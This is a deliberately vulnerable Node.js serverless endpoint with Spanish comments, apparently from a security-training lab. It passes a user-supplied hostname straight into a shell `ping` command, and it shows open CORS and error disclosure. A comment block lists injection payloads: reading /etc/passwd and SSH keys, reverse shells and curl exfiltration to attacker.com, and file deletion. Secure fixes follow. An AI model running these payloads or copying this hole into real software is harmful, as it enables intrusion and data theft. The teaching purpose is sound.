// [VULN-COMMAND-INJECTION]: Command Injection - Ejecución de comandos del sistema sin sanitización
// Este endpoint simula una vulnerabilidad de Command Injection

const { exec } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);

exports.handler = async (event, context) => {
    // [VULN-SECURITY-MISCONFIGURATION]: CORS abierto
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': '*',
        'Access-Control-Allow-Methods': 'GET, OPTIONS',
        'Content-Type': 'application/json'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    if (event.httpMethod !== 'GET') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ error: 'Method Not Allowed' })
        };
    }

    try {
        const hostname = event.queryStringParameters?.host || '';

        if (!hostname) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ error: 'Hostname es requerido' })
            };
        }

        // [VULN-COMMAND-INJECTION]: Concatenación directa de input del usuario en comando del sistema
        // [FIX]: Validar y sanitizar el input, usar librerías seguras, evitar exec/spawn con input directo
        // [TOOL]: SAST: Semgrep, Bandit (Python), ShellCheck | DAST: Comandos inyectados manualmente

        // ⚠️ CÓDIGO EXTREMADAMENTE PELIGROSO - NO USAR EN PRODUCCIÓN
        const command = `ping -c 4 ${hostname}`;

        console.log('[VULNERABLE] Comando ejecutado:', command);
        // ⚠️ Esto permite inyectar comandos adicionales:
        // - google.com; ls -la
        // - google.com && cat /etc/passwd
        // - google.com | whoami
        // - google.com; rm -rf /

        try {
            // [VULN-COMMAND-INJECTION]: Ejecutar el comando sin ninguna validación
            const { stdout, stderr } = await execPromise(command, {
                timeout: 5000, // Al menos limitamos el tiempo de ejecución
                maxBuffer: 1024 * 1024 // 1MB max
            });

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: true,
                    output: stdout || stderr,
                    executedCommand: command, // [VULN-INFO-DISCLOSURE]: Exponer el comando ejecutado
                    vulnerability: 'Command Injection',
                    hint: "Intenta: google.com; ls -la  o  google.com && whoami"
                })
            };

        } catch (execError) {
            // El comando falló, pero igual lo ejecutamos (podría revelar información)
            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: false,
                    output: execError.message,
                    stderr: execError.stderr,
                    stdout: execError.stdout,
                    executedCommand: command,
                    error: 'Comando ejecutado pero falló'
                })
            };
        }

    } catch (error) {
        // [VULN-INFO-DISCLOSURE]: Exponer detalles del error
        console.error('[ERROR]', error);

        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({
                error: 'Error al ejecutar el comando',
                details: error.message,
                stack: error.stack
            })
        };
    }
};

// ============================================
// EJEMPLOS DE PAYLOADS DE COMMAND INJECTION
// ============================================
/*
1. Listado de archivos:
   google.com; ls -la
   google.com && ls -la
   google.com | ls -la

2. Ver contenido de archivos sensibles:
   google.com; cat /etc/passwd
   google.com && cat ~/.ssh/id_rsa
   google.com; cat .env

3. Información del sistema:
   google.com; whoami
   google.com && uname -a
   google.com; env

4. Reverse shell (en un escenario real):
   google.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1
   google.com && nc -e /bin/bash attacker.com 4444

5. Exfiltración de datos:
   google.com; curl http://attacker.com/?data=$(cat /etc/passwd | base64)

6. Comandos destructivos:
   google.com; rm -rf /tmp/*
   google.com && find / -name "*.log" -delete

7. Bypass con encoding:
   google.com`whoami`
   $(echo "google.com; ls")

8. Time-based detection:
   google.com; sleep 10
   google.com && ping -c 10 127.0.0.1
*/

// [FIX COMPLETO]: Ejemplo de código seguro
/*
// Opción 1: Validar con whitelist estricta
function isValidHostname(hostname) {
    // Solo permitir hostnames válidos (alfanuméricos, guiones, puntos)
    const hostnameRegex = /^[a-zA-Z0-9.-]+$/;
    return hostnameRegex.test(hostname);
}

if (!isValidHostname(hostname)) {
    return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Hostname inválido' })
    };
}

// Opción 2: Usar librería específica en lugar de exec
const ping = require('ping');
const result = await ping.promise.probe(hostname);

// Opción 3: Si realmente necesitas exec, usar array de argumentos
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', hostname], (error, stdout, stderr) => {
    // execFile no permite inyección porque no invoca un shell
});

// Opción 4: Validar y escapar caracteres peligrosos
const { spawn } = require('child_process');
const child = spawn('ping', ['-c', '4', hostname]);
*/

// [VULN-DOS]: El endpoint podría usarse para DoS si se permite ping a recursos lentos
// [FIX]: Implementar rate limiting, timeout corto, validar contra lista de hosts permitidos

// [TOOL SUMMARY]:
// - SAST: Semgrep con rules "dangerous-child-process", Bandit, CodeQL
// - DAST: Commix (Command Injection Exploiter), OWASP ZAP
// - Manual: Probar payloads de command injection manualmente
// - Prevention: Evitar exec/eval, validar input estrictamente, usar APIs específicas en lugar de comandos shell
